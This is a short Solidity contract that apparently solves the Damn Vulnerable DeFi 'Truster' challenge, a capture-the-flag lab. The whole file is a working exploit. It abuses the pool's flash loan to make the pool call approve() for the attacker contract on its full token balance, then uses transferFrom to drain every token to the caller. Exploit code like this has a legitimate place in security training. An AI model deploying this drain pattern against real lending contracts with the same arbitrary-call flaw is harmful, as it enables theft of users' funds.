// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

/**
 * @title TrusterDrainer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterDrainer {
	function drain(address payable poolAddress, address dvtAddress) public {
		bytes memory dt = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            IERC20(dvtAddress).balanceOf(poolAddress)
        );
		TrusterLenderPool(poolAddress).flashLoan(0, address(this), dvtAddress, dt);
		IERC20(dvtAddress).transferFrom(poolAddress, msg.sender, IERC20(dvtAddress).balanceOf(poolAddress));
	}
}